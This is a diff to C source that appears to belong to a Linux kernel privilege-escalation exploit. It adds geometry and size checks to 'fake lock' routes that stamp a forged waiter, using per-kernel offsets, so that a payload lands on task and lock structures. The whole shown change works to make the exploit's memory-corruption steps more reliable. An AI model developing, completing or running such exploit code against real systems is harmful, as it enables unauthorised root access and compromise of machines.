@@ -1,4 +1,5 @@
 #include "common.h"
+#include "route_geom.h"
 #include <time.h>
 #include <netinet/in.h>
 #include <netinet/tcp.h>
@@ -701,6 +702,13 @@ void do_pselect_fake_lock_route(void) {
  * stale waiter stamps it whole, tree_pc included. Profiles opt in with
  * mcast_waiter_off. */
 void do_kernel5_fake_lock_route(void) {
+  /* the option buffer is a VLA stamped at waiter_off, so an entry with no mcast
+   * geometry (or a partial import) sizes it zero and writes off the frame. */
+  if (!mcast_geometry_ok() || active_offsets->mcast_buffer_size > 0x1000) {
+    route_last_step = 59;
+    route_last_errno = 0;
+    return;
+  }
   size_t stamp_size = active_offsets->mcast_buffer_size;
   size_t waiter_off = (size_t)active_offsets->mcast_waiter_off;
   unsigned char stamp[stamp_size];
@@ -738,8 +746,10 @@ void do_kernel5_fake_lock_route(void) {
  * Geometry comes from the entry: auxv buffer offset, its size, and the payload
  * offset that lands task/lock, all measured per kernel. */
 void do_prctl_mm_map_route(void) {
-  if (!active_offsets || !active_offsets->prctl_auxv_off ||
-      !active_offsets->prctl_auxv_size || !active_offsets->prctl_waiter_off) {
+  /* the payload is a VLA holding the whole waiter from w0; the shared
+   * predicate rejects an entry whose words would not fit inside it */
+  if (!prctl_geometry_ok_off(active_offsets) ||
+      !active_offsets->prctl_auxv_off) {
     route_last_step = 70;
     route_last_errno = 0;
     return;
